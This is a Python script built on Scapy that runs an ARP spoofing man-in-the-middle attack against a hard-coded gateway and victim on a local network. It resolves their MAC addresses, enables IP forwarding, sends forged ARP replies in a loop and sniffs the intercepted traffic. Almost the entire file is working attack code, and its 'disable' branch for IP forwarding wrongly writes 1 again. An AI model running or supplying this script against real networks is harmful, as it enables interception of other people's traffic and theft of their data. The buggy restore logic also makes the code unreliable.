from scapy.all import *
import os
import time
import sys

# This is harded coded should change to argv or raw_input
interface = "wlp3s0"
source_ip = "192.168.1.1"
destination_ip = "192.168.1.33"

# We need to get the MAC addresses of the source and destination to craft an ARP response
def getMAC(IP, interface):
	answered, unanswered = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = IP), timeout = 5, iface=interface, inter = 0.1)
	for send, recieve in answered:
		return recieve.sprintf(r"%Ether.src%")

# Create a function to toggle the IP forwarding 
def setIPForwarding(set):
    if set:
        #for Linux
        os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
    else:
        #for Linux
        os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')

# Function re-establish the connection between the victim and source
def resetARP(destination_ip, source_ip, interface):
	destinationMAC = getMAC(destination_ip, interface) # Get MAC addresses from destination
	sourceMAC = getMAC(source_ip, interface)  # Get MAC addresses from source
	send(ARP(op=2, pdst=source_ip, psrc=destination_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=destinationMAC, retry=7)) # Send request to source as if it was from the destination
	send(ARP(op=2, pdst=destination_ip, psrc=source_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=sourceMAC, retry=7))
	setIPForwarding(False)  

# Function todo attack
def mitm(destination_ip, destinationMAC, source_ip, sourceMAC):
	arp_dest_to_src = ARP(op=2, pdst=destination_ip, psrc=source_ip, hwdst=destinationMAC)
	arp_src_to_dest = ARP(op=2, pdst=source_ip, psrc=destination_ip, hwdst=sourceMAC)
	send(arp_dest_to_src)
	send(arp_src_to_dest)

# Callback function to parse the sniffed packets from the interface:
def callBackParser(packet):
	if IP in packet:
		source_ip = packet[IP].src
		destination_ip = packet[IP].dst
		print("FROM: " + str(source_ip) + " to -> " + str(destination_ip))

# The function will start the attack
def main():
	setIPForwarding(True)
	try:
		destinationMAC = getMAC(destination_ip, interface)
	except Exception as e:
		setIPForwarding(False)
		print(e)
		sys.exit(1)
	try:
		sourceMAC = getMAC(source_ip, interface)
	except Exception as e:
		setIPForwarding(False)
		print(e)
		sys.exit(1)
	while True:
		try:
			mitm(destination_ip, destinationMAC, source_ip, sourceMAC)
			sniff(iface=interface, prn=callBackParser,count=10)
		except KeyboardInterrupt:
			resetARP(destination_ip, source_ip, interface)
			break
	sys.exit(1)
main()